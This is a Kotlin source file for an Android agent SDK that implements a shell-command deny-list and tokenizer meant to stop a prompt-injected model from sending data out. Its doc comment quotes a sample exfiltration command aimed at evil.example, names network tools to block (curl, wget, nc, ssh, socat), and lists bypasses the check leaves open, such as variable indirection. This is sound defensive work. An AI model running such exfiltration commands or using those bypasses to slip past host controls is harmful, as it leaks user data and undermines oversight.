package ai.agentkernel.android

import ai.agentkernel.device.CapabilityFailure

/**
 * shell 命令黑名单 —— **默认为空 = 行为与以前完全一致**。
 *
 * ## 为什么要「默认空」
 *
 * 本 SDK 要公开发布，发布版必须**完整保留** `curl` / `wget` / `nc` / `ssh` 这些工具 ——
 * 它是通用 agent 运行时，砍掉联网命令等于砍掉一半用途。
 * 只有把 SDK 装进「联网必须走受控通道」的 App 时，宿主才显式收紧：
 *
 * ```
 * val policy = ShellCommandPolicy(
 *     deniedCommands = setOf("curl", "wget", "nc", "ssh", "scp", "socat"),
 *     denyHint = "联网请用 agent-http-get / agent-http-post（同源、鉴权由宿主注入）。",
 * )
 * val executor = AndroidCommandExecutor.forContext(context, caps, shellPolicy = policy)
 * ```
 *
 * 不传 `shellPolicy` ⇒ 用的就是这个类的默认值（空集合）⇒ 一条命令都不会被拦。
 *
 * ## 它挡的是什么，不挡什么
 *
 * 挡的是**模型按提示词注入去联网/外传**：用户定了「联网只走 `agent-http-*`（同源受控）」，
 * 而 `curl https://evil.example/?d=$(cat …)` 是一条命令就能把数据送出去的捷径。
 *
 * **它不是一个沙箱**：能改 App 的攻击者直接把 SDK 的这层判断 patch 掉即可；
 * 真正的边界是「同 UID 内不做安全承诺」。这里只是让**模型误用/被诱导**这条路走不通，
 * 并且失败得明确（告诉模型该用哪条命令），而不是静默地跑掉。
 *
 * ## 判定规则（要防绕过）
 *
 * 1. 先按 `;` `&&` `||` `|` `&` 换行 `(` `)` 分段 —— **引号里的不切**（`echo "a; curl b"` 不算）；
 * 2. 每段解析出**真实命令名**：取 basename（`/usr/bin/curl` ⇒ `curl`），
 *    跳过 `env` / `sudo` / `busybox` / `nohup` / `xargs` 这类前缀与 `VAR=value` 赋值、以及它们自己的 flag；
 *    所以 `env A=1 nc h 80`、`busybox wget …`、`sudo -u root curl …` 都能认出来；
 * 3. `sh -c "…"` / `bash -lc "…"`：把 `-c` 后面那段**递归**再看一遍（最多 3 层）；
 * 4. 命中 ⇒ **整条命令不执行**（连 shell 都不起），抛 [CapabilityFailure]，带上 [denyHint]。
 *
 * 明确不做：命令替换 `$(…)` / 反引号里的内容不做静态展开（那要真解析 shell 语法），
 * 变量间接（`c=curl; $c x`）同理 —— 这些属于「恶意构造」而不是「模型误用」，
 * 交给宿主侧的进程隔离/网络策略，本文档不假装能挡住。
 *
 * @param deniedCommands 小写命令名集合（大小写不敏感匹配，空 = 不拦任何命令）
 * @param denyHint 命中时给模型的提示（宿主会写「联网请用 agent-http-*」这类话）
 */
data class ShellCommandPolicy(
    val deniedCommands: Set<String> = emptySet(),
    val denyHint: String = "",
) {

    /** 归一化后的黑名单（小写、去空）。 */
    private val denied: Set<String> =
        deniedCommands.asSequence().map { it.trim().lowercase() }.filter { it.isNotEmpty() }.toSet()

    /** 空策略 = 不拦任何命令（发布版默认就是这个）。 */
    val isEmpty: Boolean get() = denied.isEmpty()

    /**
     * 检查一条 shell 命令行；命中黑名单抛 [CapabilityFailure]（**不执行**）。
     *
     * 由 [AndroidCommandExecutor] 在起进程**之前**调用。
     */
    fun check(commandLine: String) {
        check(commandLine, depth = 0)
    }

    private fun check(line: String, depth: Int) {
        if (denied.isEmpty() || depth > MAX_DEPTH) return
        for (segment in ShellLine.segments(line)) {
            val name = ShellLine.commandOf(segment) ?: continue
            val lower = name.lowercase()
            // sh -c "…"：真命令在字符串里，递归看一眼（这是最自然的绕过写法）。
            if (lower in ShellLine.SHELLS) {
                ShellLine.payloadOf(segment)?.let { check(it, depth + 1) }
                continue
            }
            if (lower in denied) throw CapabilityFailure(denyMessage(name))
        }
    }

    private fun denyMessage(name: String): String {
        val base = "命令「$name」被宿主的 shell 策略禁用（本机不允许直接执行它）。"
        return if (denyHint.isBlank()) base else "$base$denyHint"
    }

    private companion object {
        /** `sh -c "sh -c …"` 套娃的上限：正常命令不会这么写，超过就不再看。 */
        const val MAX_DEPTH = 3
    }
}

/**
 * 极简 shell 词法：分段 + 认命令名。
 *
 * 只做「够用且不会误伤」的那一档 —— 不实现变量展开、不做命令替换，
 * 但**必须**认得引号（否则 `echo "a; curl b"` 会被误判）。
 */
internal object ShellLine {

    /** 会「再执行一段字符串」的 shell（`-c` 后面那段要递归检查）。 */
    val SHELLS: Set<String> = setOf("sh", "bash", "dash", "mksh", "ash", "zsh")

    /** `VAR=value` 形式的环境变量赋值（不是命令）。 */
    private val ASSIGNMENT = Regex("^[A-Za-z_][A-Za-z0-9_]*=.*$")

    /**
     * 会「转手再执行后面那个命令」的前缀。
     *
     * 漏了它们就等于给了一条现成的绕过写法（`nohup curl …`、`xargs curl`）。
     */
    private val LAUNCHERS = setOf(
        "env", "sudo", "busybox", "nohup", "time", "command", "exec",
        "setsid", "nice", "ionice", "stdbuf", "xargs",
    )

    /** 这些 flag 后面**跟着一个值**（`sudo -u root curl` 里的 `root`）——不能把它当命令。 */
    private val FLAGS_WITH_VALUE: Map<String, Set<String>> = mapOf(
        "sudo" to setOf("-u", "-g", "-p", "-C", "-h", "-r", "-t", "-U", "-D"),
        "xargs" to setOf("-n", "-I", "-L", "-P", "-s", "-d", "-E", "-a"),
        "nice" to setOf("-n"),
        "ionice" to setOf("-c", "-n", "-p"),
        "stdbuf" to setOf("-i", "-o", "-e"),
    )

    /**
     * 把命令行切成「段」（每段 = 一条会各自执行的命令）。
     *
     * 分隔符：`;` `&&` `||` `|` `&` 换行 `(` `)` `{` `}`。
     * **引号与反斜杠转义里的内容不切** —— 那正是 `echo "a; curl b"` 不被误伤的原因。
     */
    fun segments(line: String): List<List<String>> {
        val out = mutableListOf<List<String>>()
        var current = mutableListOf<String>()
        val token = StringBuilder()
        var inSingle = false
        var inDouble = false
        var i = 0

        fun flushToken() {
            if (token.isNotEmpty()) {
                current += token.toString()
                token.clear()
            }
        }

        fun flushSegment() {
            flushToken()
            if (current.isNotEmpty()) out += current
            current = mutableListOf()
        }

        while (i < line.length) {
            val c = line[i]
            when {
                inSingle -> if (c == '\'') inSingle = false else token.append(c)
                inDouble -> when (c) {
                    '"' -> inDouble = false
                    '\\' -> {
                        i++
                        if (i < line.length) token.append(line[i])
                    }
                    else -> token.append(c)
                }
                c == '\'' -> inSingle = true
                c == '"' -> inDouble = true
                c == '\\' -> {
                    i++
                    if (i < line.length) token.append(line[i])
                }
                c == ';' || c == '\n' || c == '&' || c == '|' ||
                    c == '(' || c == ')' || c == '{' || c == '}' -> {
                    flushSegment()
                    // `&&` / `||`：把第二个字符一起吃掉，别多切出一段。
                    if (i + 1 < line.length && line[i + 1] == c) i++
                }
                c == ' ' || c == '\t' || c == '\r' -> flushToken()
                else -> token.append(c)
            }
            i++
        }
        flushSegment()
        return out
    }

    /**
     * 从一段里认出**真正会执行的那个命令名**（小写前的原样，basename）。
     *
     * 规则：跳过 `VAR=value`、裸 flag、以及 `env`/`sudo`/`busybox` 这类前缀（含它们的 flag 与参数）。
     * 认不出来（空段、纯赋值）返回 null。
     */
    fun commandOf(tokens: List<String>): String? {
        var i = 0
        while (i < tokens.size) {
            val raw = tokens[i]
            if (raw.isEmpty() || ASSIGNMENT.matches(raw)) {
                i++
                continue
            }
            val name = baseName(raw)
            if (name.isEmpty()) {
                i++
                continue
            }
            // 裸 flag（`-x`）：不是命令，跳过（前缀的 flag 一般已被 skipFlags 吃掉）。
            if (name.startsWith("-")) {
                i++
                continue
            }
            when {
                name == "env" -> i = skipEnv(tokens, i + 1)
                name in LAUNCHERS -> i = skipFlags(tokens, i + 1, FLAGS_WITH_VALUE[name].orEmpty())
                else -> return name
            }
        }
        return null
    }

    /** `sh -c "…"` 里 `-c` 后面那段（含 `-lc` 这种短 flag 组合）。认不出返回 null。 */
    fun payloadOf(tokens: List<String>): String? {
        for (i in 1 until tokens.size - 1) {
            val t = tokens[i]
            if (t.startsWith("-") && !t.startsWith("--") && t.contains('c')) return tokens[i + 1]
        }
        return null
    }

    /** `/usr/bin/curl` ⇒ `curl`；`./curl` ⇒ `curl`；`"curl"` ⇒ `curl`。 */
    fun baseName(token: String): String {
        var t = token.trim().trim('"', '\'')
        t = t.trimEnd('/')
        t = t.substringAfterLast('/')
        return t
    }

    /** 跳过 `env` 自己的 flag 与赋值（`-i`、`-u NAME`、`VAR=value`）。 */
    private fun skipEnv(tokens: List<String>, start: Int): Int {
        var i = start
        while (i < tokens.size) {
            val t = tokens[i]
            when {
                t == "-u" || t == "--unset" -> i += 2
                t.startsWith("--unset=") -> i += 1
                t.startsWith("-") && t != "-" -> i += 1
                ASSIGNMENT.matches(t) -> i += 1
                else -> break
            }
        }
        return i
    }

    /** 跳过前缀命令的 flag；`withValue` 里的 flag 连它后面那个值一起跳。 */
    private fun skipFlags(tokens: List<String>, start: Int, withValue: Set<String>): Int {
        var i = start
        while (i < tokens.size) {
            val t = tokens[i]
            if (t == "-" || !t.startsWith("-")) break
            i += if (t in withValue) 2 else 1
        }
        return i
    }
}
